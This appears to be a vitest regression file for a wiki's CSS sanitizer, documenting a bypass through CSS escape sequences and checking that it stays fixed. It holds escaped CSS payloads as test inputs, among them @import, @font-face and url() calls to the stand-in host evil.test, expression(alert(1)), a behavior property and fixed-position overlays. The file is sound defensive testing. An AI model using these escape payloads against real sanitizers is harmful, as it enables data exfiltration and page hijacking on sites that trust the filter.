import { describe, expect, it } from "vitest";
import { scopeArticleCss } from "@/lib/wiki/cssScope";

// QA security finding (#105, Heavy lane) — CSS-escape bypass of the X4 CSS-block strip.
//
// `scopeArticleCss` strips dangerous at-rules / properties / value tokens by matching the
// UN-DECODED literal text that css-tree puts on `node.name`, `node.property`, and the
// generated value string. But a conformant browser DECODES CSS escape sequences when it
// tokenizes — `@imp\ort` → `@import`, `po\73 ition` → `position`, `\75 rl(` → `url(`. So an
// attacker-controlled TemplateStyles `<style>` block can hide every banned construct behind
// an escape: the strip checks see a benign-looking literal, the browser sees the live token.
//
// The spike's `\75rl(` "fires no request — CSSOM-confirmed" claim was validated against
// jsdom, whose tokenizer does NOT decode these escapes the way real browsers do; that is
// why the existing jsdom-run suite never caught this. There is no CSP backstop in the repo
// (no Content-Security-Policy header in deploy/Caddyfile, next.config, or app code), so the
// sanitizer is the sole gate. This defeats AC4 (url exfiltration), AC5 (off-flow position),
// and AC6 (@import remote-CSS pull). AC7 (selector scope) is NOT affected — scoping prepends
// `.wiki-body ` unconditionally regardless of selector content.
//
// GROUND TRUTH (passing) — css-tree's own ident.decode IS the CSS Syntax tokenizer browsers
// use; it confirms the escaped forms decode to the live banned keywords.
describe("escape ground truth — css-tree decodes these to live banned keywords", () => {
  it("ident.decode maps the escaped forms to import / position / url", async () => {
    const ct: { ident?: { decode?: (s: string) => string } } = await import("css-tree");
    const decode = ct.ident?.decode;
    expect(typeof decode).toBe("function");
    expect(decode!("imp\\ort")).toBe("import");
    expect(decode!("\\69mport")).toBe("import");
    expect(decode!("po\\73 ition")).toBe("position");
    expect(decode!("\\75 rl")).toBe("url");
    expect(decode!("ur\\6c")).toBe("url");
    expect(decode!("\\000075rl")).toBe("url");
  });
});

// SECURITY TARGETS — fixed: `scopeArticleCss` now decodes CSS escape sequences (via
// css-tree's `ident.decode` for at-keywords/properties/keyword values, and a token-level
// decoded scan for function names) before every strip comparison, so an escaped banned
// construct is dropped on the same decoded form the browser tokenizes. Each of these is a
// reproduction of the original bypass and must stay dropped.
describe("AC6 — escaped @import must be dropped", () => {
  it("@imp\\ort with a remote prelude is dropped (escaped at-keyword)", async () => {
    const out = await scopeArticleCss('@imp\\ort "//evil.test/x.css";.a{color:red}');
    expect(out).not.toContain("evil.test");
  });
  it("@\\69mport (hex-escaped 'i', space-terminated) is dropped", async () => {
    const out = await scopeArticleCss('@\\69 mport "//evil.test/y.css";.a{color:red}');
    expect(out).not.toContain("evil.test");
  });
  it("@\\69mport (hex-escaped 'i', no trailing space) is dropped", async () => {
    const out = await scopeArticleCss('@\\69mport "//evil.test/y2.css";.a{color:red}');
    expect(out).not.toContain("evil.test");
  });
  it("@\\000069mport (6-digit hex escape) is dropped", async () => {
    const out = await scopeArticleCss('@\\000069mport "//evil.test/y6.css";.a{color:red}');
    expect(out).not.toContain("evil.test");
  });
  it("@\\46ONT-FACE (escaped + mixed-case) remote font fetch is dropped", async () => {
    const out = await scopeArticleCss(
      "@\\46ONT-FACE{font-family:x;src:url(//evil.test/f.woff)}.a{color:red}"
    );
    expect(out).not.toContain("evil.test");
    expect(out).not.toMatch(/font-face/i);
  });
});

describe("AC4 — escaped url() / fetch fn must be dropped", () => {
  it("\\75 rl( (hex-escaped 'u', leading char, space-terminated) exfil is dropped", async () => {
    const out = await scopeArticleCss(".x{background:\\75 rl(//evil.test/a)}");
    expect(out).not.toContain("evil.test");
  });
  it("ur\\6c( (hex-escaped 'l', mid-token) exfil is dropped", async () => {
    const out = await scopeArticleCss(".x{background:ur\\6c(//evil.test/a)}");
    expect(out).not.toContain("evil.test");
  });
  it("\\000075rl( (6-digit hex escape, no trailing space) exfil is dropped", async () => {
    const out = await scopeArticleCss(".x{background:\\000075rl(//evil.test/a)}");
    expect(out).not.toContain("evil.test");
  });
  it("\\55RL( (mixed-case hex escape of 'U') exfil is dropped", async () => {
    const out = await scopeArticleCss(".x{background:\\55RL(//evil.test/a)}");
    expect(out).not.toContain("evil.test");
  });
  it("escaped image-set fetch token (imag\\65-set) is dropped", async () => {
    const out = await scopeArticleCss(
      ".x{background-image:imag\\65-set(url(//evil.test/a) 1x)}"
    );
    expect(out).not.toContain("evil.test");
    expect(out).not.toMatch(/image-set\s*\(/i);
  });
  it("escaped expression() (IE script-in-CSS, \\65xpression) is dropped", async () => {
    const out = await scopeArticleCss(".n{width:\\65xpression(alert(1))}");
    expect(out).not.toMatch(/expression\s*\(/i);
  });
  it("an escaped url() smuggled through a custom property value is dropped", async () => {
    const out = await scopeArticleCss(".z{--bg:\\75 rl(//evil.test/x);y:1}");
    expect(out).not.toContain("evil.test");
  });
});

describe("AC5 — escaped position/property must be dropped", () => {
  it("po\\73 ition:fixed (escaped property name) is dropped", async () => {
    const out = await scopeArticleCss(".g{po\\73 ition:fixed;top:0}");
    // browser decodes the property to `position` and applies fixed positioning
    expect(out.replace(/\s+/g, "")).not.toMatch(/o\\?73\s*ition:fixed|position:fixed/i);
  });
  it("position:f\\69xed (escaped value, space-terminated) is dropped", async () => {
    const out = await scopeArticleCss(".g{position:f\\69 xed;top:0}");
    expect(out).not.toMatch(/position:\s*f/i);
  });
  it("position:f\\69xed (escaped value, no trailing space) is dropped", async () => {
    const out = await scopeArticleCss(".g{position:f\\69xed;top:0}");
    expect(out).not.toMatch(/position:\s*f/i);
  });
  it("position:\\000073ticky (6-digit-escaped value) is dropped", async () => {
    const out = await scopeArticleCss(".g{position:\\000073ticky}");
    // the whole declaration is dropped — neither the live keyword nor the escape survives
    expect(out).not.toMatch(/sticky/i);
    expect(out).not.toContain("73");
  });
  it("escaped behavior property (\\62 ehavior) is dropped", async () => {
    const out = await scopeArticleCss(".x{\\62 ehavior:url(#default#time2);color:red}");
    expect(out).not.toMatch(/behavior\s*:/i);
    expect(out).not.toContain("#default#time2");
  });
});

// FIDELITY — the decode must not over-strip legitimate non-fetching escaped CSS that real
// articles use. (The token-level fetch scan deliberately reads only function/url tokens,
// never string-token contents, so a banned keyword can never be smuggled in via a string
// — and a string literal makes no request anyway.)
describe("escape handling does not over-strip legitimate CSS", () => {
  it("a legitimate escaped Unicode value (content:\"\\2060 \") survives scoped", async () => {
    const out = await scopeArticleCss('.j{content:"\\2060 ";color:red}');
    expect(out).toContain(".wiki-body .j");
    expect(out).toContain("color:red");
    expect(out).toMatch(/content:/i);
  });
  it("position:relative and position:static survive (in-flow, harmless)", async () => {
    expect(await scopeArticleCss("td.clade-bar{position:relative}")).toContain(
      "position:relative"
    );
    expect(await scopeArticleCss(".s{position:static}")).toContain("position:static");
  });
  it("an escaped translateX()/calc() transform survives (no fetch token)", async () => {
    const out = await scopeArticleCss(".t{transform:translateX(calc(1px + 2px))}");
    expect(out).toContain("translateX");
    expect(out).toContain(".wiki-body .t");
  });
});

// FAIL-SAFE (accepted, fidelity-only loss) — a STRING literal whose escapes the css-tree
// generator decodes into the literal text `url(` (`content:"\75rl("` serializes to
// `"url("`) trips the textual value scan and the whole declaration is dropped. This is an
// over-drop, never an under-drop: a string literal issues no request, and the sibling
// declarations on the rule are unaffected. Documented so QA can distinguish it from a
// security gap.
describe("string literal that decodes to 'url(' text is dropped (fail-safe over-drop)", () => {
  it("drops content:\"\\75rl(\" but keeps the sibling declaration — no request is possible", async () => {
    const out = await scopeArticleCss('.q{content:"\\75rl(";color:red}');
    expect(out).toContain("color:red");
    expect(out).toContain(".wiki-body .q");
    expect(out).not.toContain("evil.test");
  });
});

// AC7 control — selector scope confinement is robust to escapes (this PASSES today and
// must keep passing): an escaped `body` selector still receives the `.wiki-body ` prefix.
describe("AC7 — selector scoping is robust to escapes (control, passes)", () => {
  it("an escaped bare selector is still confined under .wiki-body", async () => {
    const out = await scopeArticleCss("\\62 ody{margin:0}"); // escaped `body`
    expect(out.startsWith(".wiki-body")).toBe(true);
  });
});
